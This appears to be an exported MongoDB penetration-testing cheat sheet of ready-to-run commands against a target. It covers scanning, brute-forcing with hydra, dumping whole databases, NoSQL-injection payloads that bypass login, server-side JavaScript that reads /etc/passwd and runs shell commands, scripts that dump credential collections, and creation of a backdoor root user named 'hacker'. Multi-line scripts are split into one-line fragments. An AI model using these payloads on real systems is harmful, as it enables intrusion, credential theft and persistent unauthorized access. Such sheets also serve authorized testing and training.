---
id: "tnyfczxoemptl7mvv"
title: "mongodb"
description: ""
tags: []
order: 13
createdAt: "2026-05-31T09:38:35.803Z"
updatedAt: "2026-05-31T09:38:47.951Z"
---

## Reconnaissance
<!-- section: {"id":"pdifc1c2tmptl7vqp","order":0,"collapsed":false} -->

### 8qacvuvlhmptl7vt2
```bash
nmap -sV -sC -p 27017,27018,27019 $TARGET
```

_Reconnaissance Scan for MongoDB default port._

**Tags:** mongodb, recon, nmap, rustscan
<!-- cmd: {"id":"8qacvuvlhmptl7vt2","language":"bash","sectionId":"pdifc1c2tmptl7vqp","tags":["mongodb","recon","nmap","rustscan"]} -->

### nazkblztymptl7vt8
```bash
rustscan -a $TARGET -p 27017-27019 -- -sV -sC
```

**Tags:** mongodb, recon, nmap, rustscan
<!-- cmd: {"id":"nazkblztymptl7vt8","language":"bash","sectionId":"pdifc1c2tmptl7vqp","tags":["mongodb","recon","nmap","rustscan"]} -->

### xe5stvk91mptl7vtd
```bash
nmap -p 27017 --script=mongodb-info,mongodb-databases $TARGET
```

**Tags:** mongodb, recon, nmap, rustscan
<!-- cmd: {"id":"xe5stvk91mptl7vtd","language":"bash","sectionId":"pdifc1c2tmptl7vqp","tags":["mongodb","recon","nmap","rustscan"]} -->

## Unauthenticated Access
<!-- section: {"id":"ddxt5la2vmptl7vqt","order":1,"collapsed":false} -->

### iws3dof1bmptl7vtt
```bash
mongo $TARGET:27017
```

_Unauthenticated Access Check if MongoDB is open without auth._

**Tags:** mongodb, unauthenticated, enumeration
<!-- cmd: {"id":"iws3dof1bmptl7vtt","language":"bash","sectionId":"ddxt5la2vmptl7vqt","tags":["mongodb","unauthenticated","enumeration"]} -->

### tbcp1735kmptl7vty
```bash
mongosh "mongodb://$TARGET:27017"
```

**Tags:** mongodb, unauthenticated, enumeration
<!-- cmd: {"id":"tbcp1735kmptl7vty","language":"bash","sectionId":"ddxt5la2vmptl7vqt","tags":["mongodb","unauthenticated","enumeration"]} -->

### ktbm8hzo8mptl7vu3
```bash
mongo $TARGET:27017 --eval "db.adminCommand({listDatabases: 1})"
```

**Tags:** mongodb, unauthenticated, enumeration
<!-- cmd: {"id":"ktbm8hzo8mptl7vu3","language":"bash","sectionId":"ddxt5la2vmptl7vqt","tags":["mongodb","unauthenticated","enumeration"]} -->

### pzcq285r9mptl7vu8
```bash
mongosh "mongodb://$TARGET:27017" --eval "db.adminCommand({listDatabases:1})"
```

**Tags:** mongodb, unauthenticated, enumeration
<!-- cmd: {"id":"pzcq285r9mptl7vu8","language":"bash","sectionId":"ddxt5la2vmptl7vqt","tags":["mongodb","unauthenticated","enumeration"]} -->

### z4f3cvq7lmptl7vud
```bash
nmap -p 27017 --script mongodb-info $TARGET
```

**Tags:** mongodb, unauthenticated, enumeration
<!-- cmd: {"id":"z4f3cvq7lmptl7vud","language":"bash","sectionId":"ddxt5la2vmptl7vqt","tags":["mongodb","unauthenticated","enumeration"]} -->

### 2jp1dsdm9mptl7vuk
```bash
nmap -p 27017 --script mongodb-databases $TARGET
```

**Tags:** mongodb, unauthenticated, enumeration
<!-- cmd: {"id":"2jp1dsdm9mptl7vuk","language":"bash","sectionId":"ddxt5la2vmptl7vqt","tags":["mongodb","unauthenticated","enumeration"]} -->

## Authentication
<!-- section: {"id":"rpjzkl81wmptl7vqz","order":2,"collapsed":false} -->

### foom17zdtmptl7vuy
```bash
mongo "mongodb://$USER:$PASS@$TARGET:27017/admin"
```

_Authentication Connect with credentials._

**Tags:** mongodb, authentication, login
<!-- cmd: {"id":"foom17zdtmptl7vuy","language":"bash","sectionId":"rpjzkl81wmptl7vqz","tags":["mongodb","authentication","login"]} -->

### mcb86o831mptl7vv3
```bash
mongosh "mongodb://$USER:$PASS@$TARGET:27017/admin"
```

**Tags:** mongodb, authentication, login
<!-- cmd: {"id":"mcb86o831mptl7vv3","language":"bash","sectionId":"rpjzkl81wmptl7vqz","tags":["mongodb","authentication","login"]} -->

### cbzlbrfdjmptl7vv9
```bash
mongosh "mongodb://$USER:$PASS@$TARGET:27017/$DATABASE?authSource=admin"
```

**Tags:** mongodb, authentication, login
<!-- cmd: {"id":"cbzlbrfdjmptl7vv9","language":"bash","sectionId":"rpjzkl81wmptl7vqz","tags":["mongodb","authentication","login"]} -->

## Brute Force
<!-- section: {"id":"tkvc4yabvmptl7vr5","order":3,"collapsed":false} -->

### 8ak0mbkd3mptl7vvk
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mongodb://$TARGET
```

_Brute Force_

**Tags:** mongodb, bruteforce, hydra
<!-- cmd: {"id":"8ak0mbkd3mptl7vvk","language":"bash","sectionId":"tkvc4yabvmptl7vr5","tags":["mongodb","bruteforce","hydra"]} -->

### 9pc39hm4zmptl7vvp
```bash
nmap -p 27017 --script mongodb-brute $TARGET
```

**Tags:** mongodb, bruteforce, hydra
<!-- cmd: {"id":"9pc39hm4zmptl7vvp","language":"bash","sectionId":"tkvc4yabvmptl7vr5","tags":["mongodb","bruteforce","hydra"]} -->

## Data Enumeration
<!-- section: {"id":"zob5ujl5rmptl7vra","order":4,"collapsed":false} -->

### 31l6lvxbwmptl7vw4
```bash
show dbs
```

_Data Enumeration_

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"31l6lvxbwmptl7vw4","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### oad8ptqbcmptl7vwa
```bash
db.adminCommand({listDatabases: 1})
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"oad8ptqbcmptl7vwa","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### 8v7znreyrmptl7vwf
```bash
use $DATABASE
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"8v7znreyrmptl7vwf","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### x6o4c6jysmptl7vwk
```bash
show collections
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"x6o4c6jysmptl7vwk","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### e8z060av4mptl7vwp
```bash
db.getCollectionNames()
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"e8z060av4mptl7vwp","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### 76wp1i4kgmptl7vwt
```bash
db.$COLLECTION.find().pretty()
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"76wp1i4kgmptl7vwt","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### lbxmzo5icmptl7vwz
```bash
db.$COLLECTION.find().limit(100)
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"lbxmzo5icmptl7vwz","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### bze5t8nowmptl7vx4
```bash
db.$COLLECTION.count()
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"bze5t8nowmptl7vx4","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### 5lrbuwsyamptl7vxa
```bash
db.$COLLECTION.find({}, {"username": 1, "password": 1})
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"5lrbuwsyamptl7vxa","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### vx8ekpaf8mptl7vxf
```bash
db.getCollectionNames().forEach(function(c){
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"vx8ekpaf8mptl7vxf","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### igjw2mmzymptl7vxk
```bash
  var doc = db[c].findOne();
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"igjw2mmzymptl7vxk","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### 487m80e9mmptl7vxp
```bash
  if(doc) printjson(Object.keys(doc));
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"487m80e9mmptl7vxp","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### 8qam7kpytmptl7vxu
```bash
})
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"8qam7kpytmptl7vxu","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### a1v3aomhfmptl7vy0
```bash
mongodump --host $TARGET --port 27017 --out /tmp/mongodump/
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"a1v3aomhfmptl7vy0","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

### 243mngejnmptl7vy6
```bash
mongodump --host $TARGET --port 27017 -u $USER -p $PASS --out /tmp/mongodump/
```

**Tags:** mongodb, enumeration, datadump
<!-- cmd: {"id":"243mngejnmptl7vy6","language":"bash","sectionId":"zob5ujl5rmptl7vra","tags":["mongodb","enumeration","datadump"]} -->

## NoSQL Injection
<!-- section: {"id":"8rapcek43mptl7vrf","order":5,"collapsed":false} -->

### j3br8gr45mptl7vyl
```bash
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

_NoSQL Injection Bypass authentication with NoSQL injection._

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"j3br8gr45mptl7vyl","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### izzhpzgp5mptl7vyt
```bash
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"izzhpzgp5mptl7vyt","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### qyp5c1d04mptl7vz3
```bash
{"username": "admin", "password": {"$ne": "invalid"}}
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"qyp5c1d04mptl7vz3","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### mp5i6di96mptl7vz8
```bash
$URL?username[$ne]=x&password[$ne]=x
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"mp5i6di96mptl7vz8","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### gmmmabkczmptl7vzd
```bash
$URL?username=admin&password[$ne]=invalid
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"gmmmabkczmptl7vzd","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### 8qdgur5zamptl7vzj
```bash
curl -s -X POST $URL/login -H "Content-Type: application/json" \
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"8qdgur5zamptl7vzj","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### 1zkgwpd01mptl7vzo
```bash
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"1zkgwpd01mptl7vzo","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### 6ls9r5myjmptl7vzv
```bash
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"6ls9r5myjmptl7vzv","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### o27nfku2lmptl7vzz
```bash
python3 nosqlmap.py -u $URL --attack 2
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"o27nfku2lmptl7vzz","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

### d2cteqfj5mptl7w04
```bash
username[$ne]=invalid&password[$ne]=invalid
```

**Tags:** mongodb, nosqli, injection, exploitation, bypass
<!-- cmd: {"id":"d2cteqfj5mptl7w04","language":"bash","sectionId":"8rapcek43mptl7vrf","tags":["mongodb","nosqli","injection","exploitation","bypass"]} -->

## Enumeration via Mongo Shell
<!-- section: {"id":"2s4g6a3xjmptl7vrk","order":6,"collapsed":false} -->

### 30hasvyy2mptl7w0s
```bash
db.serverStatus()
```

_Enumeration via Mongo Shell_

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"30hasvyy2mptl7w0s","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### 3x8fte2xomptl7w0x
```bash
db.version()
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"3x8fte2xomptl7w0x","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### 2mfcb9peqmptl7w12
```bash
use admin
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"2mfcb9peqmptl7w12","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### u0skji8i7mptl7w17
```bash
db.system.users.find()
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"u0skji8i7mptl7w17","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### 6xsc9w1bkmptl7w1c
```bash
db.getUsers()
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"6xsc9w1bkmptl7w1c","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### odjabso52mptl7w1i
```bash
db.getRoles({showBuiltinRoles: true})
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"odjabso52mptl7w1i","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### 8xt1j9fo4mptl7w1n
```bash
db.hostInfo()
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"8xt1j9fo4mptl7w1n","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

### iuv8calm2mptl7w1s
```bash
db.adminCommand({getCmdLineOpts: 1})
```

**Tags:** mongodb, enumeration, admin
<!-- cmd: {"id":"iuv8calm2mptl7w1s","language":"bash","sectionId":"2s4g6a3xjmptl7vrk","tags":["mongodb","enumeration","admin"]} -->

## File Read (Server-Side JS)
<!-- section: {"id":"j6k8em60jmptl7vrp","order":7,"collapsed":false} -->

### ie3b184vpmptl7w23
```bash
db.$COLLECTION.find({"$where": "function(){ return true; }"})
```

_File Read (Server-Side JS)_

**Tags:** mongodb, ssjs, fileread, exploitation
<!-- cmd: {"id":"ie3b184vpmptl7w23","language":"bash","sectionId":"j6k8em60jmptl7vrp","tags":["mongodb","ssjs","fileread","exploitation"]} -->

### uau0uoug3mptl7w28
```bash
db.$COLLECTION.find({"$where": "function(){ return tojson(cat('/etc/passwd')); }"})
```

**Tags:** mongodb, ssjs, fileread, exploitation
<!-- cmd: {"id":"uau0uoug3mptl7w28","language":"bash","sectionId":"j6k8em60jmptl7vrp","tags":["mongodb","ssjs","fileread","exploitation"]} -->

## RCE via Server-Side JS
<!-- section: {"id":"jhwxubk57mptl7vrt","order":8,"collapsed":false} -->

### e9dpq78klmptl7w2k
```bash
db.test.mapReduce(
```

_RCE via Server-Side JS_

**Tags:** mongodb, rce, ssjs, exploitation
<!-- cmd: {"id":"e9dpq78klmptl7w2k","language":"bash","sectionId":"jhwxubk57mptl7vrt","tags":["mongodb","rce","ssjs","exploitation"]} -->

### svoe1mv4jmptl7w2p
```bash
  function() { emit(0, run("id")); },
```

**Tags:** mongodb, rce, ssjs, exploitation
<!-- cmd: {"id":"svoe1mv4jmptl7w2p","language":"bash","sectionId":"jhwxubk57mptl7vrt","tags":["mongodb","rce","ssjs","exploitation"]} -->

### v7inph5stmptl7w2u
```bash
  function(k, v) { return v; },
```

**Tags:** mongodb, rce, ssjs, exploitation
<!-- cmd: {"id":"v7inph5stmptl7w2u","language":"bash","sectionId":"jhwxubk57mptl7vrt","tags":["mongodb","rce","ssjs","exploitation"]} -->

### gxyvzwus4mptl7w2z
```bash
  {out: {inline: 1}}
```

**Tags:** mongodb, rce, ssjs, exploitation
<!-- cmd: {"id":"gxyvzwus4mptl7w2z","language":"bash","sectionId":"jhwxubk57mptl7vrt","tags":["mongodb","rce","ssjs","exploitation"]} -->

### gorrq01mqmptl7w33
```bash
)
```

**Tags:** mongodb, rce, ssjs, exploitation
<!-- cmd: {"id":"gorrq01mqmptl7w33","language":"bash","sectionId":"jhwxubk57mptl7vrt","tags":["mongodb","rce","ssjs","exploitation"]} -->

### 24bir39nomptl7w39
```bash
db.$COLLECTION.find({"$where": "function(){ return run('id') == 0; }"})
```

**Tags:** mongodb, rce, ssjs, exploitation
<!-- cmd: {"id":"24bir39nomptl7w39","language":"bash","sectionId":"jhwxubk57mptl7vrt","tags":["mongodb","rce","ssjs","exploitation"]} -->

## Credential Extraction
<!-- section: {"id":"z0fvogb2dmptl7vrz","order":9,"collapsed":false} -->

### t505x0urumptl7w3r
```bash
db.users.find({}, {"username":1,"password":1,"email":1})
```

_Credential Extraction_

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"t505x0urumptl7w3r","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### f2w5filt3mptl7w3x
```bash
db.accounts.find({}, {"user":1,"pass":1})
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"f2w5filt3mptl7w3x","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### yej8vdgm8mptl7w42
```bash
db.admins.find()
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"yej8vdgm8mptl7w42","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### vkpds6vstmptl7w47
```bash
db.credentials.find()
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"vkpds6vstmptl7w47","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### bmf26t2agmptl7w4c
```bash
db.adminCommand({listDatabases:1}).databases.forEach(function(d){
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"bmf26t2agmptl7w4c","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### 5bp3qjj7wmptl7w4i
```bash
  var mydb = db.getSiblingDB(d.name);
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"5bp3qjj7wmptl7w4i","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### p8a0nwo19mptl7w4m
```bash
  mydb.getCollectionNames().forEach(function(c){
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"p8a0nwo19mptl7w4m","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### 6n32z44zqmptl7w4r
```bash
    if(c.match(/user|account|admin|cred/i)){
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"6n32z44zqmptl7w4r","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### jy26c4wnjmptl7w4w
```bash
      print("=== " + d.name + "." + c + " ===");
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"jy26c4wnjmptl7w4w","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### w4c9adj30mptl7w52
```bash
      mydb[c].find().forEach(printjson);
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"w4c9adj30mptl7w52","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### yx1cnbj09mptl7w57
```bash
    }
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"yx1cnbj09mptl7w57","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### yip2gvog3mptl7w5c
```bash
  });
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"yip2gvog3mptl7w5c","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

### zyhrwf21emptl7w5h
```bash
})
```

**Tags:** mongodb, credentials, datadump
<!-- cmd: {"id":"zyhrwf21emptl7w5h","language":"bash","sectionId":"z0fvogb2dmptl7vrz","tags":["mongodb","credentials","datadump"]} -->

## Common Misconfigurations
<!-- section: {"id":"96jbr1yofmptl7vs4","order":10,"collapsed":false} -->

### 41oz53xqzmptl7w6g
```bash
mongo $TARGET:27017 --eval "db.adminCommand({listDatabases:1})"
```

_Common Misconfigurations_

**Tags:** mongodb, misconfiguration, hardening
<!-- cmd: {"id":"41oz53xqzmptl7w6g","language":"bash","sectionId":"96jbr1yofmptl7vs4","tags":["mongodb","misconfiguration","hardening"]} -->

### mkvohfg37mptl7w6l
```bash
grep bindIp /etc/mongod.conf
```

**Tags:** mongodb, misconfiguration, hardening
<!-- cmd: {"id":"mkvohfg37mptl7w6l","language":"bash","sectionId":"96jbr1yofmptl7vs4","tags":["mongodb","misconfiguration","hardening"]} -->

### dr1f43nccmptl7w6t
```bash
grep -A5 "security:" /etc/mongod.conf
```

**Tags:** mongodb, misconfiguration, hardening
<!-- cmd: {"id":"dr1f43nccmptl7w6t","language":"bash","sectionId":"96jbr1yofmptl7vs4","tags":["mongodb","misconfiguration","hardening"]} -->

### 4p3xxc51mmptl7w6y
```bash
mongosh $TARGET:27017 --eval "db.adminCommand({getParameter:1, authenticationMechanisms:1})"
```

**Tags:** mongodb, misconfiguration, hardening
<!-- cmd: {"id":"4p3xxc51mmptl7w6y","language":"bash","sectionId":"96jbr1yofmptl7vs4","tags":["mongodb","misconfiguration","hardening"]} -->

### 9asdanyvnmptl7w73
```bash
curl http://$TARGET:28017/_status
```

**Tags:** mongodb, misconfiguration, hardening
<!-- cmd: {"id":"9asdanyvnmptl7w73","language":"bash","sectionId":"96jbr1yofmptl7vs4","tags":["mongodb","misconfiguration","hardening"]} -->

### ghfblrgyjmptl7w77
```bash
curl http://$TARGET:28017/admin/
```

**Tags:** mongodb, misconfiguration, hardening
<!-- cmd: {"id":"ghfblrgyjmptl7w77","language":"bash","sectionId":"96jbr1yofmptl7vs4","tags":["mongodb","misconfiguration","hardening"]} -->

## Post-Exploitation
<!-- section: {"id":"i9w6ct322mptl7vs9","order":11,"collapsed":false} -->

### nbpiynjaemptl7w7l
```bash
use admin
```

_Post-Exploitation_

**Tags:** mongodb, post-exploitation, persistence
<!-- cmd: {"id":"nbpiynjaemptl7w7l","language":"bash","sectionId":"i9w6ct322mptl7vs9","tags":["mongodb","post-exploitation","persistence"]} -->

### zzel2z24fmptl7w7r
```bash
db.createUser({user:"hacker",pwd:"hacker123",roles:[{role:"root",db:"admin"}]})
```

**Tags:** mongodb, post-exploitation, persistence
<!-- cmd: {"id":"zzel2z24fmptl7w7r","language":"bash","sectionId":"i9w6ct322mptl7vs9","tags":["mongodb","post-exploitation","persistence"]} -->

### nltrsis7qmptl7w7w
```bash
mongoexport --host $TARGET --db $DATABASE --collection $COLLECTION -o /tmp/export.json
```

**Tags:** mongodb, post-exploitation, persistence
<!-- cmd: {"id":"nltrsis7qmptl7w7w","language":"bash","sectionId":"i9w6ct322mptl7vs9","tags":["mongodb","post-exploitation","persistence"]} -->

### e0os7wka3mptl7w82
```bash
mongodump --host $TARGET --port 27017 -u $USER -p $PASS --authenticationDatabase admin --out /tmp/dump
```

**Tags:** mongodb, post-exploitation, persistence
<!-- cmd: {"id":"e0os7wka3mptl7w82","language":"bash","sectionId":"i9w6ct322mptl7vs9","tags":["mongodb","post-exploitation","persistence"]} -->

## Default Credentials
<!-- section: {"id":"adyje366amptl7vse","order":12,"collapsed":false} -->

### v6vas6mcbmptl7w8o
```bash
admin    : (empty)
```

_Default Credentials_

**Tags:** mongodb, default-credentials
<!-- cmd: {"id":"v6vas6mcbmptl7w8o","language":"bash","sectionId":"adyje366amptl7vse","tags":["mongodb","default-credentials"]} -->

### ysjs66uy4mptl7w8u
```bash
admin    : admin
```

**Tags:** mongodb, default-credentials
<!-- cmd: {"id":"ysjs66uy4mptl7w8u","language":"bash","sectionId":"adyje366amptl7vse","tags":["mongodb","default-credentials"]} -->

### ctlbvutncmptl7w8z
```bash
admin    : password
```

**Tags:** mongodb, default-credentials
<!-- cmd: {"id":"ctlbvutncmptl7w8z","language":"bash","sectionId":"adyje366amptl7vse","tags":["mongodb","default-credentials"]} -->

### 28nf99owkmptl7w94
```bash
root     : root
```

**Tags:** mongodb, default-credentials
<!-- cmd: {"id":"28nf99owkmptl7w94","language":"bash","sectionId":"adyje366amptl7vse","tags":["mongodb","default-credentials"]} -->

### 0fv9dz6cymptl7w9b
```bash
mongoadmin : mongoadmin
```

**Tags:** mongodb, default-credentials
<!-- cmd: {"id":"0fv9dz6cymptl7w9b","language":"bash","sectionId":"adyje366amptl7vse","tags":["mongodb","default-credentials"]} -->
